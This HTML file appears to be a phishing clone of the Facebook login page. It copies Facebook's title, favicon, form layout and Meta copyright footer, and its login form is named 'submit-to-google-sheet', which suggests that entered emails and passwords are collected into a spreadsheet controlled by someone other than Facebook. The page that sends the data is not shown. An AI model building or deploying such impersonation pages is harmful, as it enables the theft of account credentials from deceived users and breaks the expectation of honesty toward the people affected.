<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – log in or sign up</title>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="login-header">
            <div class="logo">
                <img src="./fb.svg" alt="Facebook logo">
            </div>
            <form name="submit-to-google-sheet">
                <input type="text" name="email" id="email" placeholder="Mobile number or email address">
                <input type="password" name="pass" id="pass" placeholder="Password">
                <input type="submit" class="btn" value="Log In">
                <p>Forgotten password?</p>
            </form>
            <div class="or-container">
                <span class="or-text">or</span>
            </div>
            <div class="signup-btn">
                <a href="">Create new account</a>
            </div>
        </div>
        <div class="login-footer">
            <div class="leng">
                <div class="left-leng">
                    <p>English (UK)</p>
                    <p>অসমীয়া</p>
                    <p>नेपाली</p>
                    <p>Português (Brasil)</p>
                </div>
                <div class="right-leng">
                    <p>বাংলা</p>
                    <p>हिन्दी</p>
                    <p>Español</p>
                    <p>+</p>
                </div>
            </div>
            <div class="more">
                <p>About</p>
                <span>.</span>
                <p>Help</p>
                <span>.</span>
                <p>More</p>
            </div>
            <p class="copy">Meta © 2023</p>
        </div>
    </div>
</body>
</html>
